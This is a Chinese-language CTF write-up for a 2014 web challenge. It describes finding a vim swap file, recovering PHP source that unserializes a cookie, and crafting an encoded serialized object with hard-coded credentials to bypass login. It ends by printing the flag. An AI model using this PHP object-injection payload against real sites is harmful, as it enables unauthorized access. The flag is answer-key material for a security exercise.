# No cON Name CTF Quals 2014: MakeMeFeeWet^Hb

**Category:** Web
**Points:** 300
**Description:**

> Access == Flag
>
> Url: https://ctf.noconname.org/makemefeelweb/

## Write-up

頁面進入只有帳號密碼登入頁面，初步判斷沒有 SQL Injection。

檢視原始碼發現註解：

```
<!-- vim: set ts=2 sw=2: -->
```

初步判斷可能有 vim 備份文件。

經猜測後找到 [.login.php.swp](https://github.com/hsttw/write-ups/blob/master/no-con-name-ctf-quals-2014/MakeMeFeeWet%5EHb/login.php.swp)，可以看到片段的內容：

```
    @$data = unserialize(hex2bin(implode(explode("\\x", base64_decode($cookie)))));
if (isset($_COOKIE['JSESSIONID'])) {
    if ($username == "p00p" && $password == "l!k34b4u5") {
        $this->p = $_passwd;
        $this->u = $_uname;
    public function __construct($_uname, $_passwd) {
    public $p;
    public $u;
class Creds {
```

看到 `unserialize` 直覺是 Object Injection，設定 cookie `JSESSIONID` 後 `GET login.php` 得到

```
Getting close :)
```

判斷應該是透過 `JSESSIONID` 做 Object Injection。

根據片段的內容拼湊了一下 Object：

```
O:5:"Creds":2:{s:1:"u";s:4:"p00p";s:1:"p";s:9:"l!k34b4u5";}
```

接著對這段做 `bin2hex` 再 `base64_encode`，將得到的值設定 cookie `JESSIONID`，重新 `GET login.php` 即可得到 flag。

```
NcN_778064be6556e64577517875a8710b0abeba1578
```
